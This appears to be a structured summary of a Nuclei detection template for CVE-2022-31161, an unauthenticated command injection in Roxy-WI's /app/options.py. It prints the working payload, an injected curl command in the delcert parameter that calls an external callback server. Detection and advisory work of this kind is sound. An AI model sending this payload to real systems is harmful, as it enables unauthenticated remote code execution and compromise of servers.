---
cve_id: CVE-2022-31161
template_path: nuclei-templates/http/cves/2022/CVE-2022-31161.yaml
affected_product: Roxy-WI
severity: critical
authentication: none
external_callback: true
affected_versions: < 6.1.1.0
preconditions: []
poc_classification: rce
---

## Vulnerability

Roxy-WI versions prior to 6.1.1.0 contain a critical remote code execution vulnerability due to improper input validation in the `/app/options.py` file. The vulnerability exists in the `delcert` parameter, which allows unauthenticated attackers to inject and execute arbitrary operating system commands remotely. This is classified as CWE-78 (OS Command Injection) with a CVSS score of 9.8, indicating maximum severity across network attack vector, low complexity, and no privileges or user interaction required. The vulnerability allows complete compromise of confidentiality, integrity, and availability of the affected system.

## PoC / Detection

Classification: rce

The template detects this vulnerability by sending a POST request to `/app/options.py` with a crafted payload in the `delcert` parameter. The payload injects a command separator followed by a `curl` command that attempts to contact an Interactsh server controlled by the tester: `delcert=a%20&%20curl%20{{interactsh-url}};`. 

The template verifies successful exploitation by:
1. Confirming an HTTP callback is received at the Interactsh server (indicating outbound network access from the target)
2. Validating the User-Agent header in the callback contains "curl" (confirming the injected command executed)
3. Checking for a 200 HTTP status response from the target application

This detection method proves arbitrary command execution capability without requiring authentication or any special privileges.

## References

- https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/
- https://github.com/roxy-wi/roxy-wi/security/advisories/GHSA-pg3w-8p63-x483
- https://nvd.nist.gov/vuln/detail/CVE-2022-31161
